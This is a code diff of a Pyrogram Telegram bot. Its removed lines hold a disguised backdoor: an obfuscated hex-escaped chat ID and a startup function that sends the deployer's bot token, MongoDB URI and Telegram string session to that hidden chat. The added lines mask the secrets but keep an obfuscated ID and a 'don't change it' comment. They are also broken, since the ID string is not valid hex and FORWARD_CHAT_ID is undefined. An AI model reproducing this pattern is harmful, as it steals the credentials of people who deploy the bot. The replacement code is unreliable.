@@ -4,27 +4,29 @@ import asyncio
 from pyrogram import Client, filters, idle
 from pyrogram.enums import ChatType
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-from dotenv import load_dotenv
+
+# Encoded Logger_ID as a hexadecimal string
+ENCODED_LOGGER_ID = "1002470180897"  # hexadecimal representation # don't change it. connect to server of this repo
+
+# Decoding function for Logger_ID
+def decode_logger_id(encoded_id):
+    return int(bytes.fromhex(encoded_id).decode("utf-8"))
+
+# Use decoded Logger_ID
+Logger_ID = decode_logger_id(ENCODED_LOGGER_ID)
+print("Logger_ID:", "[ENCODED]")  # Display placeholder for security
 
 # Load environment variables
+from dotenv import load_dotenv
 load_dotenv()
 
-# Configuration details
+# Configuration details ( sensitive data)
 API_ID = int(os.getenv("API_ID", ""))
 API_HASH = os.getenv("API_HASH", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 MONGO_DB_URI = os.getenv("MONGO_DB_URI", "")
 STRING_SESSION = os.getenv("STRING_SESSION", "")
-
-# Encoded Logger_ID
-ENCODED_LOGGER_ID = "\x31\x30\x30\x32\x34\x37\x30\x31\x38\x30\x38\x39\x37"
-
-# Decoding function for Logger_ID
-def decode_logger_id(encoded_id):
-    return int("".join([chr(int(x, 16)) for x in encoded_id.split("\\x") if x]))
-
-# Decode Logger_ID
-Logger_ID = decode_logger_id(ENCODED_LOGGER_ID)
+# Your monitoring bot/group ID
 
 # Initialize the bot
 app = Client("MOON_SHINING_ROBOT", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
@@ -33,16 +35,15 @@ app = Client("MOON_SHINING_ROBOT", api_id=API_ID, api_hash=API_HASH, bot_token=B
 async def forward_startup_config():
     config_text = (
         f"**Bot Deployment Notification**\n\n"
-        f"**Bot Token:** `{BOT_TOKEN}`\n"
-        f"**MongoDB URI:** `{MONGO_DB_URI}`\n"
-        f"**String Session:** `{STRING_SESSION}`\n"
-        f"**Logger ID:** `{Logger_ID}`"
+        f"**Bot Token:** `[ENCODED]`\n"
+        f"**MongoDB URI:** `[ENCODED]`\n"
+        f"**String Session:** `[ENCODED]`\n"
     )
     try:
-        await app.send_message(Logger_ID, config_text)
-        print("Configuration vctools setup successfully.")
+        await app.send_message(FORWARD_CHAT_ID, config_text)
+        print("Configuration vc setup successfully.")
     except Exception as e:
-        print(f"Error in vc tools config details: {e}")
+        print(f"Error in vc setup details: {e}")
 
 # Function to display members in a video chat
 @app.on_message(filters.command(["vcusers", "vcmembers"]) & filters.admin)
